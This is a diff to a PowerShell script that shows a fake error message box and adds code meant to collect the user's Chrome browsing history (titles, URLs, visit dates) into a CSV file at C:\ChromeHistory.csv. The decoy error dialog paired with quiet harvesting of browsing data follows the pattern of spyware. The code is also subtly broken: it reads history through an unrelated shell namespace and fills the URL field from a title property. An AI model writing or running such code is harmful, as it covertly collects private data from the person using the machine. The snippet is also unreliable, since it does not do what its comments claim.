@@ -2,3 +2,24 @@ Add-Type -AssemblyName PresentationFramework
 
 [System.Windows.MessageBox]::Show("An error occurred. Please check your settings and try again.", "Error", [System.Windows.MessageBoxButton]::OK, [System.Windows.MessageBoxImage]::Error)
 
+# Create a new COM object for accessing Chrome history
+$shell = New-Object -ComObject "Shell.Application"
+$folder = $shell.NameSpace('shell:::{3EEF301F-B596-4C66-B106-741516675E66}')
+
+# Retrieve all items (history entries) in the folder
+$items = $folder.Items()
+
+# Loop through each history item and retrieve details
+$chromeHistory = foreach ($item in $items) {
+    [PSCustomObject]@{
+        Title = $item.Name
+        URL = $item.ExtendedProperty('System.Title')
+        VisitDate = $item.ExtendedProperty('System.DateCreated')
+    }
+}
+
+# Output the history to console (optional)
+$chromeHistory | Format-Table -AutoSize
+
+# Save history to a text file
+$chromeHistory | Export-Csv -Path "C:\ChromeHistory.csv" -NoTypeInformation
